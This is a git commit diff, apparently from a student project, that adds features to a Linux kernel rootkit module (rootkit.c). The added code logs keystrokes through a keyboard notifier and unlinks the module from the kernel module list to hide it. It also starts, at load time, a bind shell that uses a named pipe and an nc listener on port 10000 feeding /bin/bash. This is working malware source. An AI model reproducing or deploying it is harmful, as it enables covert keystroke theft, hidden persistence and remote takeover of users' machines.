b8bb96f04727caf9d7b6354c52406571c1986e4a
michael froewis <michael.froewis@student.uibk.ac.at>
2015-10-14 16:32:10 +0200

    hide and keylogger

--- Makefile
+++ Makefile
@@ -4,13 +4,15 @@ KBUILD_DIR	:= /lib/modules/$(shell uname -r)/build
 
 FILE=documentation
 
-tex: $(FILE).pdf
-
 default:
 	$(MAKE) -C $(KBUILD_DIR) M=$(shell pwd)
+
+tex: $(FILE).pdf
+
+
 clean:
 	$(MAKE) -C $(KBUILD_DIR) M=$(shell pwd) clean
-	\rm *.aux *.blg *.out *.bbl *.log *.toc *.pdf
+	\rm *.aux *.blg *.out *.bbl *.log *.toc *.pdf *~
 
 
 $(FILE).pdf: $(FILE).tex
--- rootkit.c
+++ rootkit.c
@@ -5,6 +5,9 @@
 #define MODULE
 #endif
 
+#define LOG
+/*#define HIDE*/
+
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/string.h>
@@ -20,19 +23,23 @@ static struct notifier_block nb = {
   .notifier_call = keyboard_hook
 };
 
+struct list_head * new_head;
+
 /* FUNCTIONALITY */
 
 int keyboard_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
-  struct keyboard_notifier_param *param = _param;
-  //struct vc_data *vc = param->vc;
-   
-  if (code == KBD_KEYCODE && param->down) printk(KERN_DEBUG "KEYLOGGER %i down\n", param->value);
- 
-  return NOTIFY_OK;
+	struct keyboard_notifier_param *param = _param;
+	//struct vc_data *vc = param->vc;
+
+#ifdef LOG
+	if (code == KBD_KEYCODE && param->down) printk(KERN_DEBUG "KEYLOGGER %i down\n", param->value);
+#endif
+
+	return NOTIFY_OK;
 }
 
 void hide_module(void){
-	//struct list_head * head=&(__this_module.list);
+	new_head=__this_module.list.next;
 	//if (!list_empty(head))
 	//	list_del(head->next);
 
@@ -41,20 +48,29 @@ void hide_module(void){
 }
 
 void unhide_module(void){
+	list_add(&(__this_module.list), new_head);
 }
 
-/*
 static void start_shell(void){
-  static char *path = "/data/local/shell";
-  char *argv[] = { "/data/local/shell", "127.0.0.1", "80", NULL }; //Change me
-  static char *envp[] =   { "HOME=/", "PATH=/sbin:/system/sbin:/system/bin:/system/xbin", NULL };
-  call_usermodehelper (path, argv, envp, 1);
-}*/
+//perl -e ''
+//mknod .bp p && nc -l 10000 0<.bp | /bin/bash 1>.bp
+	char *argv[] = { "/usr/bin/perl", "-e", "\'system(\"rm .bp && mknod .bp p && nc -l 10000 0<.bp | /bin/bash 1>.bp\")\'", NULL};
+	static char *envp[] =   { "HOME=/", "PATH=/sbin:/system/sbin:/system/bin:/system/xbin", NULL };
+	int rt=call_usermodehelper (argv[0], argv, envp, 1);
+
+#ifdef LOG
+	printk(KERN_DEBUG "Start shell %i %s \n", rt, argv[2]);
+#endif
+}
 
 /*BOOTSTRAPING*/
 
 static int __init rootkit_start(void){
+#ifdef HIDE	
 	hide_module();
+#endif
+	//unhide_module();
+	start_shell();
 	register_keyboard_notifier(&nb);
 	return 0;
 }
